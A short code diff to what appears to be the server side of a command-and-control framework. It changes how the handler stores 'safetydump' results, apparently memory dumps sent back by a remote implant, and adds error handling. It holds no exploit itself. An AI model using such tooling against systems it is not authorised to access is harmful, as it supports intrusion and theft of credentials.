@@ -341,11 +341,15 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 
               elif "safetydump" in executedCmd.lower():
                   rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
-                  dumppath = "%sSafetyDump-Task-%s.bin" % (DownloadsDirectory, taskIdStr)
-                  open(dumppath, 'wb').write(base64.b64decode(rawoutput))
-                  message = "Dump written to: %s" % dumppath
-                  update_task(taskId, message)
-                  print (message) 
+                  if rawoutput.startswith("[-]"):
+                    update_task(taskId, rawoutput)
+                    print (rawoutput) 
+                  else:
+                    dumppath = "%sSafetyDump-Task-%s.bin" % (DownloadsDirectory, taskIdStr)
+                    open(dumppath, 'wb').write(base64.b64decode(rawoutput))
+                    message = "Dump written to: %s" % dumppath
+                    update_task(taskId, message)
+                    print (message) 
 
               else:
                 update_task(taskId, outputParsed)
